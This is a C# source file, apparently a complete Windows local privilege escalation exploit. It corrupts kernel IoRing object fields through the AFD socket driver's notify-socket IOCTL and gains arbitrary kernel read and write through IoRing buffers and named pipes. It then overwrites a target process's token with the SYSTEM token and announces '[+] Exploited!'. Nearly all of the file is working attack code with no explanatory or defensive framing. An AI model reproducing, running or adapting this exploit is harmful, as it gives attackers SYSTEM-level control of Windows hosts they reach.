        public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        public const uint STATUS_SUCCESS = 0x00000000;
        public const uint STATUS_PENDING = 0x00000103;
        public const uint STATUS_NOT_FOUND = 0xC0000225;

        public const uint S_OK = 0;
        public const uint S_FALSE = 0x00000001;
        public const uint E_FAIL = 0x80004005;

        public const nint INVALID_HANDLE_VALUE = -1;

        public const uint PROCESS_QUERY_INFORMATION = 0x400;

        public const uint EPROC_TOKEN_OFFSET = 0x4b8;

        public const uint PIPE_UNLIMITED_INSTANCES = 0xFF;

    public static unsafe uint GetObjAddress(IntPtr h, uint pid, ref IntPtr pObjAddr)
    {
        uint status = 0;
        int bufferSize = 0;
        IntPtr pHandleInfo = IntPtr.Zero;
        IntPtr currentHandle = IntPtr.Zero;
        int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE));

        if (MyNtQuerySystemInformation == null) {
            Console.WriteLine("NtQuerySystemInformation is not resolved, exiting!");
            return S_FALSE;
        }

        Console.WriteLine("[+] Querying System Information...");

        while (MyNtQuerySystemInformation((int)SYSTEM_INFORMATION_CLASS.SystemHandleInformation, pHandleInfo, bufferSize, out bufferSize) == STATUS_INFO_LENGTH_MISMATCH)
        {
            if (pHandleInfo != IntPtr.Zero) {
                pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (uint)(2 * bufferSize));
            }
            else {
                pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (uint)(2 * bufferSize));
            }
        }

        Console.WriteLine("[+] Getting the address of IORing in process...");
        if (status == STATUS_SUCCESS)
        {
            Int64 handleCount = Marshal.ReadInt64(pHandleInfo);
            Console.WriteLine("[+] Received handle count: {0}", handleCount);

            status = STATUS_NOT_FOUND;

            Console.WriteLine("Gonna look for handle: 0x{0:X} for PID: {1}", h.ToInt64(), pid);

            int offset = sizeof(Int64);
            for (int i = 0; i < handleCount; i++)
            {
                currentHandle = IntPtr.Add(pHandleInfo, offset);
                SYSTEM_HANDLE handle = Marshal.PtrToStructure<SYSTEM_HANDLE>(currentHandle);
                ushort handleValue = handle.HandleValue;
                ushort processId = handle.UniqueProcessId;

                if (processId == pid && handleValue == h.ToInt64())
                {
                    Console.WriteLine("[+] Process handle 0x{0:X} for PID {1} found...", handleValue, pid);
                    pObjAddr = handle.Object;
                    status = STATUS_SUCCESS;
                    break;
                }

                offset += structSize;
            }
        }

        if (pHandleInfo != IntPtr.Zero)
        {
            HeapFree(GetProcessHeap(), 0, pHandleInfo);
        }

        return status;
    }

        static uint WriteData(IntPtr addr, uint data) {
            NativeOverlapped overlapped = new NativeOverlapped();
            IntPtr handle = CreateIoCompletionPort(-1, IntPtr.Zero, UIntPtr.Zero, 0);
            AFD_NOTIFYSOCK_STRUCT inbuf1 = new AFD_NOTIFYSOCK_STRUCT {
                Handle = handle,
                Length1 = 0x1,
                List1 = Marshal.AllocHGlobal(0x1000),
                Length2 = data,
                List2 = Marshal.AllocHGlobal(0x20 * (int)data),
                CONTORLDATA = (ulong)addr.ToInt64(),
                DATA3 = 0x41414141
            };

            if (inbuf1.Handle != IntPtr.Zero) {
                for (int i = 0; i < inbuf1.Length2; i++) {
                    if (!PostQueuedCompletionStatus(inbuf1.Handle, 0, UIntPtr.Zero, ref overlapped)) {
                        Console.WriteLine($"[{i}] Error when queued completion status");
                        return S_FALSE;
                    }
                }
            }
            else {
                Console.WriteLine("Error when create I/O completion port");
                return S_FALSE;
            }


            IntPtr s;
            sockaddr_in sa = new();
            WSAData wsaData = new WSAData();
            int WSAStartupResult = WSAStartup(2, out wsaData);

            s = socket(ADDRESS_FAMILIES.AF_INET, SOCKET_TYPE.SOCK_STREAM, PROTOCOL.IPPROTO_TCP);
            sa.sin_port = htons(135);
            sa.sin_addr.S_addr = inet_addr("127.0.0.1");
            sa.sin_family = (short)AddressFamily.InterNetwork;
            int ierr = connect(s, ref sa, Marshal.SizeOf<sockaddr_in>());

            IntPtr pNotifySock = VirtualAlloc(IntPtr.Zero, (uint)Marshal.SizeOf<AFD_NOTIFYSOCK_STRUCT>(), AllocationType.Commit, MemoryProtection.ReadWrite);
            Marshal.StructureToPtr<AFD_NOTIFYSOCK_STRUCT>(inbuf1, pNotifySock, false);

            uint lpBytesReturned = 0;
            DeviceIoControl(
                (IntPtr)s,
                0X12127,
                pNotifySock,
                (uint)Marshal.SizeOf<AFD_NOTIFYSOCK_STRUCT>(),
                IntPtr.Zero,
                0,
                out lpBytesReturned,
                IntPtr.Zero
            );

            if (pNotifySock != IntPtr.Zero)
            {
                VirtualFree(pNotifySock, (uint)Marshal.SizeOf<AFD_NOTIFYSOCK_STRUCT>(), MEM_RELEASE);
            }

            return S_OK;
        }

        public static uint ArbWrite(HIORING ioRing, ref IntPtr buffer, IntPtr hPipeServer, IntPtr hPipeClient, IntPtr writeDst, byte[] writeBuffer)
        {
            bool bStatus = false;
            uint status = 0;
            IORING_CQE cqe;
            uint bytesWritten = 0;
            NativeOverlapped overlapped = new();

            bStatus = WriteFile(hPipeServer, writeBuffer, (uint)writeBuffer.Length, out bytesWritten, ref overlapped);
            if (!bStatus)
            {
                Console.WriteLine("[x] Failed to write to pipe server");
                return S_FALSE;
            }

            IOP_MC_BUFFER_ENTRY mcBuffer = new IOP_MC_BUFFER_ENTRY();
            mcBuffer.Address = writeDst;
            mcBuffer.Length = (uint)writeBuffer.Length;
            mcBuffer.Type = 0xC02;
            mcBuffer.Size = 0x80;
            mcBuffer.AccessMode = (char)1;
            mcBuffer.ReferenceCount = 1;
    
            IntPtr pMcBufferEntry = VirtualAlloc(IntPtr.Zero, (uint)Marshal.SizeOf<IOP_MC_BUFFER_ENTRY>(), AllocationType.Commit, MemoryProtection.ReadWrite);
            Marshal.StructureToPtr<IOP_MC_BUFFER_ENTRY>(mcBuffer, pMcBufferEntry, false);
            Marshal.WriteIntPtr(buffer, 0, pMcBufferEntry);

            var fileRef = IoRingHandleRefFromHandle(hPipeClient);
            var dataRef = IoRingBufferRefFromIndexAndOffset(0, 0);

            status = (uint)BuildIoRingReadFile(ioRing, ref fileRef, ref dataRef, (uint)writeBuffer.Length, 0, IntPtr.Zero, IORING_SQE_FLAGS.IOSQE_FLAGS_NONE);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to read from IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            status = (uint)SubmitIoRing(ioRing, 0, 0);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to submit to IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            status = (uint)PopIoRingCompletion(ioRing, out cqe);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to pop on da IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            if (cqe.ResultCode != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] IoRing failed: 0x{0:X}", cqe.ResultCode);
                status = S_FALSE;
                goto clear;
            }

clear:
            if (pMcBufferEntry != IntPtr.Zero)
            {
                VirtualFree(pMcBufferEntry, (uint)Marshal.SizeOf<IOP_MC_BUFFER_ENTRY>(), MEM_RELEASE);
            }

            return status;
        }

        public static uint ArbRead(HIORING ioRing, IntPtr buffer, IntPtr hPipeServer, IntPtr hPipeClient, IntPtr readSrc, IntPtr readBuffer, uint len)
        {
            bool bStatus = false;
            uint status = 0;
            IORING_CQE cqe;

            IOP_MC_BUFFER_ENTRY mcBuffer = new IOP_MC_BUFFER_ENTRY();
            mcBuffer.Address = readSrc;
            mcBuffer.Length = len;
            mcBuffer.Type = 0xC02;
            mcBuffer.Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
            mcBuffer.AccessMode = (char)1;
            mcBuffer.ReferenceCount = 1;
            
            IntPtr pMcBufferEntry = VirtualAlloc(IntPtr.Zero, (uint)Marshal.SizeOf<IOP_MC_BUFFER_ENTRY>(), AllocationType.Commit, MemoryProtection.ReadWrite);
            Marshal.StructureToPtr<IOP_MC_BUFFER_ENTRY>(mcBuffer, pMcBufferEntry, false);
            Marshal.WriteIntPtr(buffer, 0, pMcBufferEntry);

            var fileRef = IoRingHandleRefFromHandle(hPipeClient);
            var bufferRef = IoRingBufferRefFromIndexAndOffset(0, 0);

            status = (uint)BuildIoRingWriteFile(ioRing, ref fileRef, ref bufferRef, len, 0, FILE_WRITE_FLAGS.FILE_WRITE_FLAGS_NONE, IntPtr.Zero, IORING_SQE_FLAGS.IOSQE_FLAGS_NONE);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed when writing to IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            status = (uint)SubmitIoRing(ioRing, 0, 0);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to submit to IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            status = (uint)PopIoRingCompletion(ioRing, out cqe);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed when popping on IoRing: 0x{0:X}", status);
                status = S_FALSE;
                goto clear;
            }

            if (cqe.ResultCode != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] IoRing failed: 0x{0:X}", cqe.ResultCode);
                status = S_FALSE;
                goto clear;
            }

            uint numBytesRead = 0;
            byte[] tmpReadBuffer = new byte[len];

            bStatus = ReadFile(hPipeServer, tmpReadBuffer, len, out numBytesRead, IntPtr.Zero);
            if (!bStatus)
            {
                Console.WriteLine("[x] Failed to read from pipe server");
                status = S_FALSE;
                goto clear;
            }

            // Copy from managed byte[] buffer to target ptr
            Marshal.Copy(tmpReadBuffer, 0, readBuffer, (int)len);
            status = S_OK;

clear:
            if (pMcBufferEntry != IntPtr.Zero)
            {
                VirtualFree(pMcBufferEntry, (uint)Marshal.SizeOf<IOP_MC_BUFFER_ENTRY>(), MEM_RELEASE);
            }

            return status;
        }

        public static void Elevate(uint pid)
        {
            uint count = 1;
            uint status = 0;
            IORING_CREATE_FLAGS flag;
            HIORING hIoRing;
            // IORING_OBJECT pIoRing;

            // Actual token data
            IntPtr pSystemToken = IntPtr.Zero;

            IntPtr systemTokenAddr = IntPtr.Zero;
            IntPtr procTokenAddr = IntPtr.Zero;
            IntPtr pIoRing = IntPtr.Zero;
            ulong address = 0x1000000;

            //
            // EXPLOIT SETUP
            //

            Console.WriteLine("[+] Creating WritePipeServer");
            IntPtr writePipeServer = CreateNamedPipe("\\\\.\\pipe\\IoRingWrite", (uint)PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, (uint)PipeModeFlags.PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (writePipeServer == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[x] Failed to create IoRingWrite pipe!");
                return;
            }

            Console.WriteLine("[+] Creating WritePipeClient");
            IntPtr writePipeClient = CreateFileA("\\\\.\\pipe\\IoRingWrite", FileAccess.GENERIC_READ | FileAccess.GENERIC_WRITE, FileShare.FILE_SHARE_READ | FileShare.FILE_SHARE_WRITE, IntPtr.Zero, FileMode.OPEN_ALWAYS, FileAttributes.NORMAL, IntPtr.Zero);
            if (writePipeClient == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[x] Failed to open handle to IoRingWrite!");
                return;
            }

            Console.WriteLine("[+] Creating ReadPipeServer");
            IntPtr readPipeServer = CreateNamedPipe("\\\\.\\pipe\\IoRingRead", (uint)PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, (uint)PipeModeFlags.PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (readPipeServer == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[x] Failed to create IoRingRead pipe!");
                return;
            }

            Console.WriteLine("[+] Creating ReadPipeClient");
            IntPtr readPipeClient = CreateFileA("\\\\.\\pipe\\IoRingRead", FileAccess.GENERIC_READ | FileAccess.GENERIC_WRITE, FileShare.FILE_SHARE_READ | FileShare.FILE_SHARE_WRITE, IntPtr.Zero, FileMode.OPEN_ALWAYS, FileAttributes.NORMAL, IntPtr.Zero);
            if (readPipeClient == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[x] Failed to open handle to IoRingRead!");
                return;
            }

            flag.Advisory = IORING_CREATE_ADVISORY_FLAGS.IORING_CREATE_ADVISORY_FLAGS_NONE;
            flag.Required = IORING_CREATE_REQUIRED_FLAGS.IORING_CREATE_REQUIRED_FLAGS_NONE;

            Console.WriteLine("[+] Creating IoRing (v3)");
            status = (uint)CreateIoRing(IoRingVersion.IoRingVersion3, flag, 0x10000, 0x20000, out hIoRing);
            if (status != 0)
            {
                Console.WriteLine("[x] Failed to create IoRing: 0x{0:X} ", status);
                return;
            }

            Console.WriteLine("[+] Allocating buffer");
            IntPtr buffer = VirtualAlloc((IntPtr)address, (uint)IntPtr.Size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
            if (buffer == IntPtr.Zero)
            {
                Console.WriteLine("[x] Failed to allocate buffer");
                return;
            }

            //
            // MAIN EXPLOIT PART
            // 
            Console.WriteLine("[+] Get IoRing object address");
            // Dereferencing hIoRing ptr to receive handle value
            status = GetObjAddress(Marshal.ReadIntPtr(hIoRing.DangerousGetHandle()), GetCurrentProcessId(), ref pIoRing);
            if (status != S_OK)
            {
                Console.WriteLine("[x] Failed to get IoRing object address: 0x{0:X}", status);
                return;
            }
            Console.WriteLine("[+] IORING_OBJECT address is 0x{0:X}\n", pIoRing.ToInt64());

            //
            // READ SYSTEM TOKEN
            //
            Console.WriteLine("[+] Changing RegBuffersCount in IORING_OBJECT");
            Console.WriteLine("[*] &(pIORING->RegBuffersCount: {0:X}", IntPtr.Add(pIoRing, (int)Marshal.OffsetOf<IORING_OBJECT>("RegBuffersCount")));
            status = WriteData(IntPtr.Add(pIoRing, (int)Marshal.OffsetOf<IORING_OBJECT>("RegBuffersCount")), count);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to read system token: 0x{0:X}", status);
                goto cleanup;
            }
            Console.WriteLine("[+] Change RegBuffersCount in IORING_OBJECT done\n");

            Console.WriteLine("[+] Changing RegBuffers in IORING_OBJECT");
            var addrRegBuffers = IntPtr.Add(pIoRing, (int)Marshal.OffsetOf<IORING_OBJECT>("RegBuffers"));
            Console.WriteLine("[*] &(pIORING->RegBuffersCount + 0x3: {0:X}", IntPtr.Add(addrRegBuffers, 3));
            status = WriteData(IntPtr.Add(addrRegBuffers, 3), 1);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to read system token: 0x{0:X}", status);
                goto cleanup;
            }
            Console.WriteLine("[+] Change RegBuffers in IORING_OBJECT done\n");


            Console.WriteLine("[+] Changing field in HIORING");

            unsafe
            {
                _HIORING* handlePtrIoRing = (_HIORING*)hIoRing.DangerousGetHandle();
                handlePtrIoRing->RegBufferArray = buffer;
                handlePtrIoRing->BufferArraySize = count;
            }
            Console.WriteLine("[+] Change field in HIORING done\n");

            Console.WriteLine("[+] Getting system token address");
            status = GetObjAddress((IntPtr)4, 4, ref systemTokenAddr);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to get system token address: 0x{0:X}", status);
                goto cleanup;
            }

            Console.WriteLine("[+] System process EPROC address is 0x{0:X}, token address is 0x{1:X}\n", systemTokenAddr.ToInt64(), systemTokenAddr.ToInt64() + EPROC_TOKEN_OFFSET);

            systemTokenAddr = IntPtr.Add(systemTokenAddr, (int)EPROC_TOKEN_OFFSET);

            //
            // OPEN TARGET PROCESS, GET PROCESS TOKEN ADDR
            //
            Console.WriteLine("[+] Getting target process token address");
            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            status = GetObjAddress(processHandle, GetCurrentProcessId(), ref procTokenAddr);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to get target process token address: 0x{0:X}", status);
                goto cleanup;
            }

            Console.WriteLine("[+] Target process EPROC address is 0x{0:X}, token address is 0x{1:X}\n", procTokenAddr.ToInt64(), procTokenAddr.ToInt64() + EPROC_TOKEN_OFFSET);

            procTokenAddr = IntPtr.Add(procTokenAddr, (int)EPROC_TOKEN_OFFSET);

            //
            // READ SYSTEM TOKEN
            //
            Console.WriteLine("[+] Reading system token (allocating)");
            pSystemToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            if (pSystemToken == IntPtr.Zero) {
                Console.WriteLine("[x] Failed to allocate buf for SystemToken");
                goto cleanup;
            }

            Console.WriteLine("[+] Reading system token (reading)");
            status = ArbRead(hIoRing, buffer, readPipeServer, readPipeClient, systemTokenAddr, pSystemToken, sizeof(ulong));
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to read system token: 0x{0:X}", status);
                goto cleanup;
            }

            Console.WriteLine("[+] SystemToken is at addr {0:X}", pSystemToken);

            //
            // WRITE SYSTEM TOKEN TO TARGET PROCESS
            //
            Console.WriteLine("[+] Modifying token data");

            // Copy data from ptr into variable
            byte[] systemTokenBytes = new byte[8];
            Marshal.Copy(pSystemToken, systemTokenBytes, 0, 8);
            ulong systemToken = BitConverter.ToUInt64(systemTokenBytes, 0);

            // Clear out
            Console.WriteLine("[+] SystemToken before clear out is {0:X}\n", systemToken);
            systemToken &= 0xfffffffffffffff0;
            Console.WriteLine("[+] SystemToken after clear out is {0:X}\n", systemToken);

            // Write modified token into target process
            Console.WriteLine("[+] Writing token to target process");
            status = ArbWrite(hIoRing, ref buffer, writePipeServer, writePipeClient, procTokenAddr, systemTokenBytes);
            if (status != STATUS_SUCCESS)
            {
                Console.WriteLine("[x] Failed to write target process token: 0x{0:X}", status);
                goto cleanup;
            }

            Console.WriteLine("[+] Exploited!");

        cleanup:
            if (pSystemToken != IntPtr.Zero) {
                Marshal.FreeHGlobal(pSystemToken);
            }

            if (pIoRing != IntPtr.Zero) {
                byte[] clean = new byte[] { 0x00 };

                var addrRegBuffers2 = IntPtr.Add(pIoRing, (int)Marshal.OffsetOf<IORING_OBJECT>("RegBuffers"));
                status = ArbWrite(hIoRing, ref buffer, writePipeServer, writePipeClient, IntPtr.Add(addrRegBuffers2, 3), clean);
                Console.WriteLine("[+] Clean RegBuffers in IORING_OBJECT done\n");
            }

            if (!hIoRing.IsNull) {
                unsafe
                {
                    _HIORING* handlePtrIoRing = (_HIORING*)(IntPtr)hIoRing;
                    handlePtrIoRing->RegBufferArray = IntPtr.Zero;
                }
            }
        }

        public static void Run(uint pid)
        {
            Console.WriteLine("[+] Resolving DLL ntdll.dll");
            IntPtr hNtdll = LoadLibrary("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("Failed to resolve DLL ntdll.dll");
                return;
            }

            Console.WriteLine("[+] Resolving func NtQuerySystemInformation");
            IntPtr pFunc = GetProcAddress(hNtdll, "NtQuerySystemInformation");
            if (pFunc == IntPtr.Zero) {
                Console.WriteLine("Failed to resolve func NtQuerySystemInformation");
                return;
            }

            MyNtQuerySystemInformation = Marshal.GetDelegateForFunctionPointer<NtQuerySystemInformationDelegate>(pFunc);

            Elevate(pid);

            FreeLibrary(hNtdll);
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("sizeof IORING_CREATE_FLAGS: {0}", Marshal.SizeOf<IORING_CREATE_FLAGS>());
            Console.WriteLine("sizeof IORING_CQE: {0}", Marshal.SizeOf<IORING_CQE>());
            Console.WriteLine("sizeof IORING_HANDLE_REF: {0}", Marshal.SizeOf<IORING_HANDLE_REF>());
            Console.WriteLine("sizeof IORING_HANDLE_REF.HandleUnion: {0}", Marshal.SizeOf<IORING_HANDLE_REF.HandleUnion>());
            Console.WriteLine("sizeof IORING_INFO: {0}", Marshal.SizeOf<IORING_INFO>());
            Console.WriteLine("sizeof NT_IORING_CREATE_FLAGS: {0}", Marshal.SizeOf<IORING_CREATE_FLAGS>());
            Console.WriteLine("sizeof NT_IORING_INFO: {0}", Marshal.SizeOf<NT_IORING_INFO>());
            Console.WriteLine("sizeof IORING_OBJECT: {0}", Marshal.SizeOf<IORING_OBJECT>());
            Console.WriteLine("sizeof IORING_CAPABILITIES: {0}", Marshal.SizeOf<IORING_CAPABILITIES>());
            Console.WriteLine("sizeof IORING_BUFFER_REF: {0}", Marshal.SizeOf<IORING_BUFFER_REF>());
            Console.WriteLine("sizeof IORING_BUFFER_REF.BufferUnion: {0}", Marshal.SizeOf<IORING_BUFFER_REF.BufferUnion>());

            Console.WriteLine("sizeof IoRingBufferInfo: {0}", Marshal.SizeOf<IoRingBufferInfo>());
            Console.WriteLine("sizeof IoRingRegisteredBuffer: {0}", Marshal.SizeOf<IoRingRegisteredBuffer>());

            Console.WriteLine("sizeof HIORING: {0}", Marshal.SizeOf<HIORING>());
            Console.WriteLine("sizeof _HIORING: {0}", Marshal.SizeOf<_HIORING>());

            Console.WriteLine("sizeof SYSTEM_HANDLE: {0}", Marshal.SizeOf<SYSTEM_HANDLE>());
            Console.WriteLine("sizeof SYSTEM_HANDLE_INFORMATION");
            Console.WriteLine("sizeof DISPATCHER_HEADER");
            Console.WriteLine("sizeof KEVENT: {0}", Marshal.SizeOf<KEVENT>());
            Console.WriteLine("sizeof LIST_ENTRY: {0}", Marshal.SizeOf<LIST_ENTRY>());

            Console.WriteLine("sizeof IOP_MC_BUFFER_ENTRY: {0}", Marshal.SizeOf<IOP_MC_BUFFER_ENTRY>());
            Console.WriteLine("sizeof AFD_NOTIFYSOCK_STRUCT: {0}", Marshal.SizeOf<AFD_NOTIFYSOCK_STRUCT>());

            Console.WriteLine("sizeof WSAData: {0}", Marshal.SizeOf<WSAData>());
            Console.WriteLine("sizeof sockaddr");
            Console.WriteLine("sizeof sockaddr_in: {0}", Marshal.SizeOf<sockaddr_in>());

            uint pid = 0;

            if (args.Length != 1 || !uint.TryParse(args[0], out pid))
            {
                Console.WriteLine("[!] Usage: exp.exe <pid>");
                return;
            }

            Run(pid);
        }
    }
}
